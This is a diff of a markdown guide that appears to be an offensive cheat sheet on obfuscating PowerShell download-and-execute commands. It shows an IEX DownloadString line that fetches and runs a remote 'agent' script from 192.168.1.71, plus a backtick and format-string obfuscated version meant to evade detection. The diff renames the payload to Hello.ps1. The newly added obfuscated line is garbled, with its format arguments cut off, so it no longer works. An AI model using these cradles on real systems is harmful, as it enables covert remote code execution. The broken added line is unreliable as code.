@@ -519,13 +519,13 @@ The above string can be obfuscated using **powershell special characters:** **`*
       Another way to use 'splatting + reorder' technic to remote download/execute agent
 
 - String command to obfuscate<br />
-`IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.71/agent.ps1")`
+`IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.71/Hello.ps1")`
 
 - String obfuscated<br />
 
-      I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.71/Ag`En`T.ps`1")' -f'Ne','Download','http://','lie') | I`EX
+      I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.71/He`ll`o.ps`1")' -f'Ne','Download','http://)
 
-![powershell obfuscation](http://i.cubeupload.com/RG5OKP.jpg)
+![powershell obfuscation](http://i.cubeupload.com/p9j54c.jpg)
 
 ---
 
